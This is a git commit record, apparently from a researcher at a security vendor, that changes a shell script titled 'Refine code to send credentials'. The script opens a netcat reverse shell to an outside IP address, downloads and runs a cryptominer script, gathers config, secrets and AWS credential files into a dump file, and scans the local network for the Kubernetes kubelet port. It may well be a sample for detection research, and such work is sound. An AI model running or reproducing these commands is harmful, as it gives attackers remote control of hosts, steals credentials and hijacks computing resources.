4cc7c2c45b4d595a5ff72b2b10108dc6c70ed4cf
Nischay <nhegde@uptycs.com>
2024-03-18 17:16:17 +0530

    Refine code to send credentials

--- run.sh
+++ run.sh
@@ -6,8 +6,9 @@ nc 205.134.240.43 8001 -e /bin/bash &
 wget https://raw.githubusercontent.com/uptycs-nhegde/super-benign-scripts/master/xmrig_final.py -O run.py
 python3 run.py &
 # extract credentials
-find / -print -iname 'aws' exec cat {} > /tmp/creds_dump
-find / -print -iname 'kubernetes' exec cat {} >> /tmp/creds_dump
+find / -type f -iname 'config' -print -exec cat {} > /tmp/creds_dump
+find / -type f -iname 'secrets' -print -exec cat {} >> /tmp/creds_dump
+cat /root/.aws/config >> /tmp/creds_dump
 # scan for other hosts
 masscan -p10250 192.168.0.0/16 --rate=1000 > /tmp/out
 cat /tmp/out | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt
